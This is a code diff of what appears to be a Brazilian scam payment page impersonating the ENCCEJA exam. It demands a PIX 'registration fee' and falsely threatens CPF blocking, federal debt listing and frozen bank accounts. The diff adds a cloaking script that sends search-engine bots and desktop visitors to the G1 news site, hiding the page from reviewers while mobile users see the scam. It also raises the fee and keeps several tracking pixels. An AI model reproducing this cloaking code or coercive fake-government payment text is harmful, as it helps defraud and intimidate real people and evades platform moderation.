@@ -8,11 +8,41 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" />
     <script src="https://cdn.tailwindcss.com"></script>
     
-    <!-- Script UTM Handler -->
-    <script 
-            src="https://d1atmqbt05kisf.cloudfront.net/scripts/utm-handler.js"
-            data-token="03e84f3d-5678-4a63-8c78-eb4459e13467"
-            data-click-id-param="click_id">
+    <!-- Verificação de dispositivo desktop -->
+    <script>
+        // Função para detectar se é um dispositivo móvel
+        function isMobile() {
+          return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+        
+        // Função para detectar se é um bot
+        function isBot() {
+          const botAgents = [
+            'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
+            'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver'
+          ];
+        
+          return botAgents.some(bot => navigator.userAgent.includes(bot));
+        }
+        
+        // Função para verificar se a largura da janela é maior que 768px
+        function isWideScreen() {
+          return window.innerWidth > 768;
+        }
+        
+        // Redirecionar ou bloquear o acesso
+        function checkAccess() {
+          if (isBot() || (!isMobile() && isWideScreen())) {
+            // Redirecionar para o site G1 se o acesso for bloqueado
+            window.location.href = "https://g1.globo.com/";
+          }
+        }
+        
+        // Executar a função de verificação ao carregar a página
+        window.onload = checkAccess;
+        
+        // Adicionar um listener para verificar novamente se a janela for redimensionada
+        window.addEventListener('resize', checkAccess);
     </script>
 
     <!-- Facebook Pixel Code -->
@@ -28,7 +58,7 @@
       fbq('init', '1418766538994503');
       fbq('init', '1345433039826605'); // Segundo pixel adicionado
       fbq('init', '1390026985502891'); // Terceiro pixel adicionado
-      fbq('init', '190097557439571');  // Quarto pixel adicionado
+      fbq('init', '190097557439571');  // Quarto pixel adicionado 
       fbq('init', '1226790281278977'); // Quinto pixel adicionado
       fbq('track', 'PageView');
     </script>
@@ -479,7 +509,7 @@
                             <i class="fas fa-exclamation-triangle text-yellow-300 mr-2 text-xl"></i>
                             <h3 class="font-bold text-lg text-base" style="font-size: 16px;">NOTIFICAÇÃO OFICIAL</h3>
                         </div>
-                        <p class="mb-3" style="font-size: 16px;">Ao prosseguir, você concordou com o pagamento da taxa de inscrição no valor de <strong>R$93,40</strong>. Conforme regulamento, o não pagamento resultará em <strong>bloqueio de CPF</strong> por 3 anos no sistema ENCCEJA.</p>
+                        <p class="mb-3" style="font-size: 16px;">Ao prosseguir, você concordou com o pagamento da taxa de inscrição no valor de <strong>R$123,40</strong>. Conforme regulamento, o não pagamento resultará em <strong>bloqueio de CPF</strong> por 3 anos no sistema ENCCEJA.</p>
                         <p class="mb-3" style="font-size: 16px;">O não pagamento resultará na inscrição do nome e CPF em <strong>dívida ativa da União</strong>, incidindo multas e encargos legais sobre o valor original. Esta situação pode acarretar em bloqueio de contas bancárias, intimações judiciais, redução do score de crédito e negativação do nome em órgãos de proteção.</p>
                         <p class="font-semibold" style="font-size: 16px;">Efetue o pagamento imediatamente para regularizar sua situação.</p>
                     </div>
@@ -512,7 +542,7 @@
                         <div class="mb-6">
                             <div class="flex items-center justify-between mb-4">
                                 <h3 class="text-lg font-bold text-gray-800">Taxa de Inscrição</h3>
-                                <p class="text-lg font-bold text-gray-800">R$ 93,40</p>
+                                <p class="text-lg font-bold text-gray-800">R$ 123,40</p>
                             </div>
 
                             <!-- PIX Code -->
@@ -536,7 +566,7 @@
                                         <li>Abra o aplicativo do seu banco</li>
                                         <li>Selecione a opção "Pagar com PIX" ou "PIX Copia e Cola"</li>
                                         <li>Cole o código copiado no campo indicado</li>
-                                        <li>Confira o valor de R$ 93,40 e confirme o pagamento</li>
+                                        <li>Confira o valor de R$ 123,40 e confirme o pagamento</li>
                                     </ol>
                                 </div>
                             </div>
